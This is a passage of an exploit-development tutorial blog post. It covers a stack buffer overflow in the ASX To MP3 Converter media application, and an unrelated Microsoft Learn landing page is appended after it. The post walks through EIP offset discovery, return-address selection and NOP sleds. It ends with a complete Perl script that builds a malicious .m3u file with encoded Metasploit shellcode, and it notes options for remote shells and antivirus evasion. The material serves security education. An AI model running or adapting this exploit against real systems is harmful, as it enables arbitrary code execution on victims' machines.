[![findmsp2](http://www.securitysift.com/wp-content/uploads/2013/12/findmsp2.png)](http://www.securitysift.com/wp-content/uploads/2013/12/findmsp2.png)

As you can see, it now returns all instances of EIP offsets.

### Finding a location for our shellcode

Now that we’ve confirmed we can control the EIP overwrite (and resulting execution flow), we’re ready to modify the exploit script to make it execute code of our choosing. In order to redirect execution to something useful we need to determine where our resulting shellcode is going to reside and then point EIP at that location.  To do this we need to examine the CPU registers and memory content at the time of application crash and EIP overwrite.  Let’s go back to our Immunity output in CPU view:

Notice there are three registers that currently point to some location in our 50,000 byte buffer: EBX, ESP and EBP.

[![asx2mp3_immunity5](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity5.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity5.png)

We want to use our EIP overwrite to tell the application to redirect to one of these registers and execute the code it points to. Which register we choose depends on a couple of things:

1. The amount of uninterrupted code at that location — sometimes our exploit code can be mangled or truncated as it’s written to memory by the application so we need to ensure that we have enough space to insert usable shellcode (usually at least 500 bytes) and that the code will not be modified in any way by the application.
2. Our ability to redirect to one of those registers — in order to tell the application to redirect to a register that points to our shellcode, we need to overwrite EIP with an address to an existing instruction such as JMP or CALL .  Remember that EIP is overwritten with an address pointer to an instruction, not an actual instruction. In other words, we can’t overwrite EIP with opcode corresponding to jump ESP (\xff\xe4).  Instead, we need to overwrite it with a memory address that points to such an instruction. On top of that, we need to ensure that the address we use does not contain null bytes (\x00). Why? Because a null byte acts as a terminator, meaning that once the application hits the null byte, execution terminates and anything you put after the EIP overwrite (in this case our shellcode) will not be executed. There are some exceptions to the null byte rule but for this first example, just keep in mind we are trying to avoid addresses containing null bytes. If you’re confused by any this, don’t worry I’ll demonstrate.

Ok, so we need to tell the application to redirect or “jump” to a register containing our shellcode.  In this case we are lucky because we have three possible registers to choose from: EBX, ESP, and EBP.

Let’s check the first criteria for register EBX: the amount of uninterrupted code at that location.  In the CPU Registers pane, right-click the address in EBX and select “Follow in Dump”.

[![asx2mp3_immunity6](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity6.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity6.png)

In the Memory Dump pane (lower left corner) you should see the contents of that address and the addresses that follow.  Start scrolling down, paying attention to see if there are any breaks in the our inserted buffer.  Eventually, you should see a break, in my case it was just after location 000FCFCC.

[![asx2mp3_immunity7](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity7.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity7.png)

To estimate how much uninterrupted shellcode space we have at EBX we can subtract the start of EBX (000FBBD4) from 000FCFCC.  This comes to 0x13F8 or 5,112 bytes.  That’s plenty of available space so EBX is a good candidate.

We can continue this exercise with the other two registers (ESP and EBP) to determine where the most space lies.  Alternatively, we can use *!mona findmsp* to check for the available space.  Remember that out-of-the-box, the offsets displayed by findmsp only correspond to the first occurrence of the pattern but the detected length should still be accurate and useful to you when determining the available space for shellcode. Run *!mona findmsp* and look at the lengths returned for our three registers.

[![asx2mp3_immunity8](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity8.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity8.png)

If we’re going by available space, it appears ESP has the most, so let’s check ESP for the second criteria: our ability to redirect to that location using our EIP overwrite. For this first stack-based overflow example we’re going to stick with a simple jump or call instruction that takes us right to our desired register. To accomplish this, we need to find a JMP ESP or CALL ESP instruction.

Here’s how you can do this in Immunity:

Right-click on the CPU instruction pane of the CPU View, select “Search for” and click “All Commands in all modules”.  This will search all loaded modules (.exe and all DLLs) for our jmp/call instruction.

[![asx2mp3_immunity9](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity9.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity9.png)

Enter the desired instruction, in this case “jmp esp”.

[![asx2mp3_immunity10](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity10.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity10.png)

As you can see in the below screenshot we get many results but the problem is that the only usable addresses (those in green) are OS (vs. application) modules — notice they all being with “C:\WINDOWS” vs. “C:\Program Files\Mini-Stream\ASX to MP3 Converter…”. While these DLLs/modules are certainly usable as valid jmp instructions if there are no alternatives, OS modules may vary across different “flavors” of Windows.  For example, a DLL address may be different between Windows SP2 and SP3 or between SP3 French and SP3 English. To ensure better portability of your exploit code, you want to choose instructions from application modules whenever possible.

[![asx2mp3_immunity11](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity111.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity111.png)

Unfortunately we get similar results (all OS modules) if we try “call esp”. Note: there are other instructions we could try but for simplicity sake, I’m sticking with a simple jump or call for this example.

[![asx2mp3_immunity12](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity12.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity12.png)

Although no application modules contained the necessary jmp/call instructions for the ESP register, we’re fortunate enough in this example to have two other registers pointing to our buffer, so instead of using an OS module, let’s try a different register.

Try searching for “call ebx”.  This time, the results include many addresses from application modules.

[![asx2mp3_immunity14](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity14.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity14.png)

The problem with these first results is that they all begin with a null byte, which as you recall, would act as a string terminator, preventing execution of the shellcode that follows our EIP overwrite.  Scroll down further in the results and you should see some that do not begin with null bytes:

[![asx2mp3_immunity13](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity13.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity13.png)

Let’s choose one — I’ll pick 01C27228 (from MSA2Mcodec00.dll).  This is the value we’ll use to overwrite EIP. IMPORTANT!!: Your “call ebx” addresses are going to differ from what you see in the above screenshot because of something called address “rebasing”. In fact, as you’ll see in part 3, there is good reason to choose an OS module over an application module in this case, though I don’t want to get into that until the next post. For now, you can go ahead and choose any of the “call ebx” addresses from an application module as long as it doesn’t contain null bytes. Just note that if you reboot your machine, the exploit will not longer work and you’ll have to go back and choose another “call ebx” address.

Ok, so we have successfully replicated the application crash, verified control over EIP, verified our offset to EIP (26,121), we have a register (EBX) that points to an uninterrupted portion of our buffer of sufficient length, and we have a usable address to a CALL EBX instruction that we’ll use to overwrite EIP.  Let’s incorporate all of this into our exploit code.

[![asx2mp3_sploit_10](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_10.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_10.png)

### Finding the offset to our shellcode

Right now our 50,000 byte buffer consists of:

[![asx2mp3_buffer1](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_buffer1.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_buffer1.png)

The EBX register points to a ~5,100 byte section of the $fill portion of our buffer, but where? We need to know so we can strategically place our shellcode.   We can use a few different methods to determine our shellcode offset.

***Pausing program execution to determine the shellcode offset***

Take a look at the next screenshot of our exploit.

[![asx2mp3_sploit_6-1](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_6-1.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_6-1.png)

What I’ve done is constructed the $fill portion of the buffer with INT (interrupt) instructions (\xcc in hex). When the application comes to the INT instruction, it pauses execution. This is very useful for use with a debugger because it allows us to see exactly where in our buffer we land when CALL EBX is executed. Let’s take a look at what happens when we open our updated m3u file containing this buffer:

[![asx2mp3_sploit_7](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_7.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_7.png)

You can see that when the application hits the INT instruction and pauses, EBX contains 000FBBD4 and EIP 000FBBD5 (the current instruction).  If we follow the latter address in the memory dump pane, and scroll up until we come to the beginning our our buffer fill, we end up right around address 000F729E.  If we subtract this address from 000FBBD5 (the start of EBX) we get 0x4937 or 18,743.  This is the approximate length of our buffer that follows our CALL EBX instruction and we’re going to put our shellcode after it.  Why do I say approximate?  There is the possibility that a portion of our buffer was corrupted or removed when written to memory so we know that we have at least 18,743 bytes of the $fill portion of our original buffer that need to precede our shellcode.  I’ll show you how to get a more exact length in just a moment.

Another way to look at it is how far from the beginning our our buffer should we place our exploit code? To find out, add 18,743 to the length of the buffer that precedes $fill (junk + EIP = 26,125), which comes to 44,868.  In other words, at the very least, our shellcode should start after the first 44,686 bytes of our buffer (though we’ll want to pad this a bit more to account for changes in memory location or possible corruption of our buffer).

Using interrupts to pause program execution and examine the memory/registers is one quick way of determining the placement of the shellcode within the buffer but there are more exact methods.

***Using Metasploit pattern\_offset.rb to determine the shellcode offset***

The Metasploit pattern offset script can tell us exactly where EBX points to in our pattern-based buffer (which was created using the sister pattern\_create.rb script).  Recall the contents of our registers at the time of crash/EIP overwrite:

[![asx2mp3_immunity5](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity5.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity5.png)

EBX starts with Fn9F.  Using the metasploit pattern offset ruby script we can find out exactly where in the pattern buffer this resides:

[![asx2mp3_sploit_9](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_9.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_9.png)

In our case, the offset is 44,877.  Before I incorporate this into our script, let me show you how to get the same result with the mona plugin.

***Using mona to determine the shellcode offset***

You can once again refer to the findmsp results from mona to see the offset of our buffer in EBX.

[![findmsp3](http://www.securitysift.com/wp-content/uploads/2013/12/findmsp3.png)](http://www.securitysift.com/wp-content/uploads/2013/12/findmsp3.png)

Again, with the out-of-the-box mona plugin you’ll only see the first offset but this screenshot reflects my updated code which confirms the offset of 44,877.

Now that we know the offset to our shellcode, let’s update our exploit buffer accordingly. Assuming an offset of 44,877, the first 26,125 bytes will be taken up by the “junk” portion of our buffer (26,121 bytes) and our EIP overwrite (4 bytes). This leaves 18,752 bytes that need to precede our shellcode.  Let’s adjust our script to test this out:

[![asx2mp3_sploit_8](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_8.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_sploit_8.png)

What I’ve done here is add another variable “$nops” that will hold the portion of our buffer after the EIP overwrite and before our shellcode in order to simulate our shellcode offset of 44,877.  I made the length of $nops one more than the amount needed to precede our shellcode and comprised it of all INT instructions so that if the program execution lands somewhere within $nops it will immediately pause and we can see where we ended up. If the offset from pattern\_offset/mona is correct, the call EBX should land exactly on the last INT instruction in the $nops portion of the buffer (18,752 + 1).  Let’s run the program with our updated m3u exploit file and take a look at Immunity:

[![asx2mp3_immunity15](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity15.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_immunity15.png)

As you can see, we landed exactly on our last Interrupt instruction and the next instruction to execute is the very first byte of the $fill portion of our buffer (soon-to-be shellcode) meaning the offset provided by pattern\_offset/mona was accurate.  The reality is we don’t have to be this accurate — our original estimated placement could have served us just fine because we can (and should) always place an innocuous buffer before our shellcode to allow for deviations in memory addresses.

To do so, we typically use what’s called a no-operation instruction (NOP), which on the x86 architecture is represented by hex value 0x90.  Stringing these NOPs together forms what’s commonly called a NOP slide or NOP sled.  When the program execution hits this series of NOPs, it “slides” until it hits a set of executable instructions, which in our case will be our shellcode that follows.

When constructing your buffer, it’s generally a good idea to have the EIP CALL/JMP instruction land somewhere towards the beginning/middle of a series of NOPS.  Since we have a large portion available for our shellcode, I’ll precede it with a NOP sled of length 18,852 (18,752 offset + an extra 100 for padding).  This entire portion of our buffer will serve both as our shellcode offset and our NOP sled.

Now our buffer looks as follows (with the last portion reserved for our shellcode):

[![asx2mp3_buffer2](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_buffer2.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_buffer2.png)

### Constructing the Shellcode

The last thing we need is some actual shellcode. Of course, the shellcode we choose depends on what we want the exploit to do…spawn a remote shell, add an administrative user, etc.  In our case we’ll choose something benign — open the Windows calculator (calc.exe). The next thing we have to consider is whether there are any characters that will break our shellcode.  For example, for reasons already discussed, null bytes can be problematic in shellcode.  Also problematic are carriage returns, line feeds and other string terminators.  There may also be cases where the application itself either can’t process certain characters or changes the value (converts/encodes, etc) of certain characters.  As a result, shellcode creation can sometimes be trial and error.  Luckily in this case, the shellcode creation is pretty straightforward. You can download/copy shellcode from Exploit DB, but for this example I’ll show you how to create some basic payloads using Metasploit.

Metasploit has a command-line shellcode generation function called msfpayload.  You can use the -l switch to see Windows-specific payloads:

```
msfpayload -l | grep windows
```

In our case we’ll be using windows/exec which enables arbitrary command execution, suitable for calling calc.exe.  To use msfpayload, you need to know the options associated with each payload, which you can get by appending the payload name with a capital O.

Given the available options, the syntax for the payload is as follows:

```
msfpayload windows/exec CMD=calc.exe R
```

If you examined the options with the “O” parameter, you might have noticed one additional option called “EXITFUNC”. This parameter controls how the shellcode will exit when completed. I didn’t specify a value for EXITFUNC which means default value of “thread” will be used, which terminates only the associated thread. The other options for payload exit are SEH (let exception handler manage the exit) and Process (kill the whole process and not just the thread).  The EXITFUNC choice can make a big difference in how the exploit behaves when it terminates so you may need to experiment. For example, if you’re injecting an exploit into a parent process that must continue to run after the exploit terminates, you may want to avoid process and instead stick with thread. Similarly, choosing SEH as an option if the application does not implement any error handling may cause the process to hang on exit (“Application X has encountered a problem and needs to close…”).

The CMD option is self explanatory and the “R” stands for Raw which will output our shellcode as raw byte code. However, we need to encode the shellcode before we incorporate it into our script. To do so, we can pipe our msfpayload output to the msfencode function as follows:

```
msfpayload windows/exec CMD=calc.exe R | msfencode -e x86/shikata_ga_nai -c 1 -t perl -b '\x00\x0a\x0d\xff'
```

The -e switch tells msfencode which encoder to use, the -c switch tells how many iterations to perform, the -t switch indicates the output format, and the -b switch tells the encoder which “bad” characters to exclude.  This command results in a 227 byte encoded payload. I save detailed discussion of encoding for future posts. For now just remember choosing an encoder may be influenced by how the application encodes user input (e.g. unicode) and can also come in handy with certain AV evasion techniques.

As a side note, you can also achieve the same thing with the msfvenom module as follows:

```
msfvenom -p windows/exec CMD=calc.exe -f perl -b '\x00\xff\x0a\x0d'
```

Which one you use (msfpayload w/ msfencode or msfvenom) is really just a matter of preference.

You can find more information on using msfpayload here: [http://www.offensive-security.com/metasploit-unleashed/Msfpayload](http://www.offensive-security.com/metasploit-unleashed/Msfpayload "Msfpayload | Metasploit Unleashed")

### Putting it all together

Now that we have our 227 byte shellcode, our final buffer looks like this (note that we have an additional 4,796 bytes available should we want to use a different, larger shellcode).

[![asx2mp3_buffer3](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_buffer3.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_buffer3.png)

Here’s our final exploit code:

`#!/usr/bin/perl`

#########################################################################

my $buffsize = 50000; # sets buffer size for consistent sized payload

my $junk = “\x41” x 26121; # offset to EIP overwrite

my $eip = pack(‘V’, 0x01C27228); # call ebp (MSA2Mcodec00.dll) – YOURS WILL DIFFER!

my $nops = “\x90” x 18752;

# msfpayload windows/exec CMD=calc.exe R |

# msfencode -e x86/shikata\_ga\_nai -c 1 -t perl -b ‘\x00\x0a\x0d\xff’

# size 227

my $shell =

“\xba\x8d\xf5\x02\x51\xda\xc0\xd9\x74\x24\xf4\x5b\x2b\xc9” .

“\xb1\x33\x31\x53\x12\x03\x53\x12\x83\x66\x09\xe0\xa4\x84” .

“\x1a\x6c\x46\x74\xdb\x0f\xce\x91\xea\x1d\xb4\xd2\x5f\x92” .

“\xbe\xb6\x53\x59\x92\x22\xe7\x2f\x3b\x45\x40\x85\x1d\x68” .

“\x51\x2b\xa2\x26\x91\x2d\x5e\x34\xc6\x8d\x5f\xf7\x1b\xcf” .

“\x98\xe5\xd4\x9d\x71\x62\x46\x32\xf5\x36\x5b\x33\xd9\x3d” .

“\xe3\x4b\x5c\x81\x90\xe1\x5f\xd1\x09\x7d\x17\xc9\x22\xd9” .

“\x88\xe8\xe7\x39\xf4\xa3\x8c\x8a\x8e\x32\x45\xc3\x6f\x05” .

“\xa9\x88\x51\xaa\x24\xd0\x96\x0c\xd7\xa7\xec\x6f\x6a\xb0” .

“\x36\x12\xb0\x35\xab\xb4\x33\xed\x0f\x45\x97\x68\xdb\x49” .

“\x5c\xfe\x83\x4d\x63\xd3\xbf\x69\xe8\xd2\x6f\xf8\xaa\xf0” .

“\xab\xa1\x69\x98\xea\x0f\xdf\xa5\xed\xf7\x80\x03\x65\x15” .

“\xd4\x32\x24\x73\x2b\xb6\x52\x3a\x2b\xc8\x5c\x6c\x44\xf9” .

“\xd7\xe3\x13\x06\x32\x40\xeb\x4c\x1f\xe0\x64\x09\xf5\xb1” .

“\xe8\xaa\x23\xf5\x14\x29\xc6\x85\xe2\x31\xa3\x80\xaf\xf5” .

“\x5f\xf8\xa0\x93\x5f\xaf\xc1\xb1\x03\x2e\x52\x59\xea\xd5” .

“\xd2\xf8\xf2”;

my $sploit = $junk.$eip.$nops.$shell; # sploit portion of buffer

my $fill = “\x43” x ($buffsize – (length($sploit))); # filler for consistency

my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file

my $file = “asx2mp3.m3u”;

open(FILE, “>$file”);

print FILE $buffer;

close(FILE);

print “Exploit file created [” . $file . “]\n”;

print “Buffer size: ” . length($buffer) . “\n”;

Generate the final .m3u file and open it with ASX To MP3 Converter and you should see this:

[![asx2mp3_calc](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_calc.png)](http://www.securitysift.com/wp-content/uploads/2013/12/asx2mp3_calc.png)

If calc doesn’t open, make sure you’re running the .m3u file from the root of C:\ and that you’ve named the file asx2mp3.m3u. Remember, this exploit is far from perfect due to the file path’s influence over successful execution and the use of an application module (DLL) that implements address rebasing. We’ll take a look at how to address both of these issues in Part 3.

### Conclusion

That’s it for Part 2 in this series.  Hopefully you now understand the basics of a stack-based buffer overflow including why it’s a problem, how it can manifest itself in a software application, and how to exploit it to force arbitrary code execution.

In Part 3, I’ll continue the discussion of stack-based overflows and how to overcome basic issues such as dynamic EIP offsets and slightly more complicated jumps to shellcode.  I’ll begin, once again, with the ASX To MP3 application and show one way we might overcome the changing EIP offset caused by the inclusion of the file path in memory.

[Follow @SecuritySift](http://twitter.com/securitysift)

### Related Posts:

* [Windows Exploit Development – Part 1: The Basics](http://www.securitysift.com/windows-exploit-development-part-1-basics/ "Windows Exploit Development Part 1 - The Basics | SecuritySift.com")
* [Windows Exploit Development – Part 2: Intro to Stack Based Overflows](http://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/ "Windows Exploit Development - Part 2: Intro to Stack Based Overflows")
* [Windows Exploit Development – Part 3: Changing Offset and Rebased Modules](http://www.securitysift.com/windows-exploit-development-part-3-changing-offsets-and-rebased-modules/ "Windows Exploit Development - Part 3: Changing Offsets and Rebased Modules | SecuritySift.com")
* [Windows Exploit Development – Part 4: Locating Shellcode with Jumps](http://www.securitysift.com/windows-exploit-development-part-4-locating-shellcode-jumps/ "Windows Exploit Development - Part 4: Locating Shellcode with Jumps | SecuritySift.com")
* [Windows Exploit Development – Part 5: Locating Shellcode with Egghunting](http://www.securitysift.com/windows-exploit-development-part-5-locating-shellcode-egghunting "Windows Exploit Development - Part 5: Locating Shellcode With Egghunting | SecuritySift")
* [Windows Exploit Development – Part 6: SEH Exploits](http://www.securitysift.com/windows-exploit-development-part-6-seh-exploits "Windows Exploit Development - Part 6: SEH Exploits | SecuritySift")
* [Windows Exploit Development – Part 7: Unicode Buffer Overflows](http://www.securitysift.com/windows-exploit-development-part-7-unicode-buffer-overflows "Windows Exploit Development - Part 7: Unicode Buffer Overflows | SecuritySift")

### Share this:

* [Twitter](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/?share=twitter "Click to share on Twitter")
* [Facebook](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/?share=facebook "Click to share on Facebook")
* [LinkedIn](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/?share=linkedin "Click to share on LinkedIn")
* Email
* [Pinterest](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/?share=pinterest "Click to share on Pinterest")
* [Reddit](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/?share=reddit "Click to share on Reddit")

In category: [Exploits](https://www.securitysift.com/category/exploits/)
Tags:[ASX To MP3 Converter](https://www.securitysift.com/tag/asx-to-mp3-converter/) , [buffer overflow](https://www.securitysift.com/tag/buffer-overflow/) , [debugger](https://www.securitysift.com/tag/debugger/) , [exploit](https://www.securitysift.com/tag/exploit/) , [immunity](https://www.securitysift.com/tag/immunity/) , [mona](https://www.securitysift.com/tag/mona/) , [mona plugin](https://www.securitysift.com/tag/mona-plugin/) , [overflow](https://www.securitysift.com/tag/overflow/) , [shellcode](https://www.securitysift.com/tag/shellcode/) , [stack based buffer overflow](https://www.securitysift.com/tag/stack-based-buffer-overflow/) , [stack based overflow](https://www.securitysift.com/tag/stack-based-overflow/) , [stack overflow](https://www.securitysift.com/tag/stack-overflow/)

### 34 Comments [add one](#leave-comment)

Previous post: [Windows Exploit Development – Part 1: The Basics](https://www.securitysift.com/windows-exploit-development-part-1-basics/)

Next post: [Bug Bounty Blitz!](https://www.securitysift.com/bug-bounty-blitz/)

Connect with me...
[![]( https://www.securitysift.com/wp-content/themes/news-leak/images/rss.png)](http://www.securitysift.com/?feed=rss) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/in.png)](www.linkedin.com/in/michaelczumak%20) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/tweeter.png)](https://twitter.com/SecuritySift) [![]( https://www.securitysift.com/wp-content/themes/news-leak/images/face.png)](https://www.facebook.com/secsift)

* Most Popular Posts
* Random Posts

* [Offensive Security’s PWB and OSCP — My Experience](https://www.securitysift.com/offsec-pwb-oscp/ "Offensive Security’s PWB and OSCP — My Experience")October 9, 2013
* [Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/ "Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)")November 29, 2014
* [Windows Exploit Development – Part 2: Intro to Stack Based Overflows](https://www.securitysift.com/windows-exploit-development-part-2-intro-stack-overflow/ "Windows Exploit Development – Part 2: Intro to Stack Based Overflows")December 13, 2013
* [peCloak.py – An Experiment in AV Evasion](https://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/ "peCloak.py – An Experiment in AV Evasion")March 9, 2015
* [Phishing with Macros and Powershell](https://www.securitysift.com/phishing-with-macros-and-powershell/ "Phishing with Macros and Powershell")May 22, 2015

* [Cross Origin Request Forgery – Attacking HTTPS via HTTP MiTM Injection](https://www.securitysift.com/cross-origin-request-forgery-attacking-https-via-http-mitm-injection/)October 1, 2012
* [The Search For Shellshock](https://www.securitysift.com/the-search-for-shellshock/)September 28, 2014
* [Exploiting MS14-066 / CVE-2014-6321 (aka “Winshock”)](https://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/)November 29, 2014
* [Windows Exploit Development – Part 7: Unicode Buffer Overflows](https://www.securitysift.com/windows-exploit-development-part-7-unicode-buffer-overflows/)September 3, 2014
* [Phishing with Macros and Powershell](https://www.securitysift.com/phishing-with-macros-and-powershell/)May 22, 2015

### Categories

* [Breaches](https://www.securitysift.com/category/breaches/)
* [Exploits](https://www.securitysift.com/category/exploits/)
* [Opinion](https://www.securitysift.com/category/opinion/)
* [Pentesting](https://www.securitysift.com/category/pentesting/)
* [Puzzles](https://www.securitysift.com/category/puzzles/)
* [Training/Certifications](https://www.securitysift.com/category/trainingcertifications/)
* [Uncategorized](https://www.securitysift.com/category/uncategorized/)
* [Web Security](https://www.securitysift.com/category/web-security/)

### Archives

* [October 2017](https://www.securitysift.com/2017/10/)
* [September 2017](https://www.securitysift.com/2017/09/)
* [May 2015](https://www.securitysift.com/2015/05/)
* [April 2015](https://www.securitysift.com/2015/04/)
* [March 2015](https://www.securitysift.com/2015/03/)
* [February 2015](https://www.securitysift.com/2015/02/)
* [December 2014](https://www.securitysift.com/2014/12/)
* [November 2014](https://www.securitysift.com/2014/11/)
* [October 2014](https://www.securitysift.com/2014/10/)
* [September 2014](https://www.securitysift.com/2014/09/)
* [July 2014](https://www.securitysift.com/2014/07/)
* [May 2014](https://www.securitysift.com/2014/05/)

### Pages

* [About](https://www.securitysift.com/about/)
* [My Library](https://www.securitysift.com/my-library/)
### Follow me on Twitter

[My Tweets](https://twitter.com/422832532212559872)

The views and and opinions expressed in this blog are my own and do not represent those of my previous or current employer. © Copyright 2025 Security Sift. All Rights Reserved,
[News Leak theme by Archy Studio](http://www.archystudio.com/website-design/)

---



=== Content from msdn.microsoft.com_33127cc7_20250126_005629.html ===

[Skip to main content](#main)

This browser is no longer supported.

Upgrade to Microsoft Edge to take advantage of the latest features, security updates, and technical support.

[Download Microsoft Edge](https://go.microsoft.com/fwlink/p/?LinkID=2092881 )
[More info about Internet Explorer and Microsoft Edge](https://learn.microsoft.com/en-us/lifecycle/faq/internet-explorer-microsoft-edge)

Table of contents

# Microsoft Learn. Spark possibility.

Build skills that open doors. See all you can do with documentation, hands-on training, and certifications to help you get the most from Microsoft products.

Search

* ![](/en-us/media/home-and-directory/featured-training_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-training_dark.jpg?branch=live)

  Learn by doing

  Gain the skills you can apply to everyday situations through hands-on training personalized to your needs, at your own pace or with our global network of learning partners.

  [Take training](/en-us/training/)
* ![](/en-us/media/home-and-directory/featured-documentation_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-documentation_dark.jpg?branch=live)

  Find technical documentation

  Get tools and step-by-step guidance to help you get the most from Microsoft products such as Azure, Windows, Office, Dynamics, Power Apps, Teams, and more.

  [View documentation](docs/)
* ![](/en-us/media/home-and-directory/featured-cert_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-cert_dark.jpg?branch=live)

  Showcase your skills

  Advance in your career by completing challenges that demonstrate your expertise. Earn globally recognized and industry-endorsed certifications, and showcase them to your network.

  [Get certified](/en-us/certifications/)
* ![](/en-us/media/home-and-directory/featured-qna_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-qna_dark.jpg?branch=live)

  Ask questions and get help

  Connect with other learners and experts, ask and answer questions, share resources, and learn together.

  [Explore Q&A](/en-us/answers/products/)
* ![](/en-us/media/home-and-directory/featured-samples_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-samples_dark.jpg?branch=live)

  Try code samples

  Test out new capabilities in your own projects faster and easier with code samples that bring Microsoft technology to life.

  [See samples](/en-us/samples/browse/)
* ![](/en-us/media/home-and-directory/featured-shows_light.jpg?branch=live)
  ![](/en-us/media/home-and-directory/featured-shows_dark.jpg?branch=live)

  See new ways to innovate

  Discover thousands of fun, authentic, and informative videos by Microsoft and community experts that help you and your team find inventive ways to use technology.

  [Watch shows](/en-us/shows/)

## Level up with Microsoft Learn

* 15%

  On average, certified employees earn 15 percent more than those without certification.

  [Why get certified?](/en-us/certifications/posts/microsoft-learn-why-get-certified)
* 61%

  Upon earning a certification, 61 percent of tech professionals say they earned a promotion.

  [2021 Pearson VUE Value of IT Certification](https://home.pearsonvue.com/voc)
* 90%

  Microsoft-certified developers are 90 percent more productive and nearly 60 percent more efficient.

  [Why get certified?](/en-us/certifications/posts/microsoft-learn-why-get-certified)

## Meet inspirational learners from the community

* ![Ricardo Lessa](/en-us/media/home-and-directory/avatar-Ricardo.jpg?branch=live)

  Ricardo Lessa

  Pre-sales engineer

  "I was able to believe again in the possibility of starting over, updating myself, and returning to the IT market."

  [Read Ricardo's story](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/certifications-can-spark-confidence-amidst-unexpected-changes/ba-p/2038069)
* ![Jacqueline Ye](/en-us/media/home-and-directory/avatar-Jacqueline.jpg?branch=live)

  Jacqueline Ye

  Product manager

  "I want others to know that with some hard work, dedication, and having an always be learning mindset, you can have a fullfilling career."

  [Read Jacqueline's story](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/how-microsoft-learn-advance-women-in-tech/ba-p/2038068)
* ![Charles-Henri Sauget](/en-us/media/home-and-directory/avatar-Charles-Henri.jpg?branch=live)

  Charles-Henri Sauget

  Data platform and technical leader

  "Certifications have really helped me earn my customer's trust as a consultant."

  [Read Charles-Henri's story](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/continue-staying-ahead-with-microsoft-certifications/ba-p/2038070)

![](/en-us/media/home-and-directory/section-testimonials_light.jpg?branch=live)
![](/en-us/media/home-and-directory/section-testimonials_dark.jpg?branch=live)

## Find additional resources

* [Startups](https://www.microsoft.com/startups?wt.mc_id=learn_startupmodule_webpage_cnl)

  Radically accelerate innovation with free access to industry-leading AI services, OpenAI credits, expert guidance, and the essential technology needed to build a startup through Microsoft for Startups Founders Hub.
* [Student Hub](/en-us/training/student-hub/)

  Learn technical skills to prepare you for your future. Find training, virtual events, and opportunities to connect with the Microsoft student developer community.
* [Educator Center](/en-us/training/educator-center/)

  Dive deep into learning with interactive lessons, earn professional development hours, acquire certifications and find programs that help meet your goals.
* [Microsoft Learn Blog](https://techcommunity.microsoft.com/t5/microsoft-learn-blog/bg-p/MicrosoftLearnBlog)

  Get the latest updates, articles, and news for learning content and events from the Microsoft Learn community.
* [Virtual Training Days](https://events.microsoft.com/mvtd)

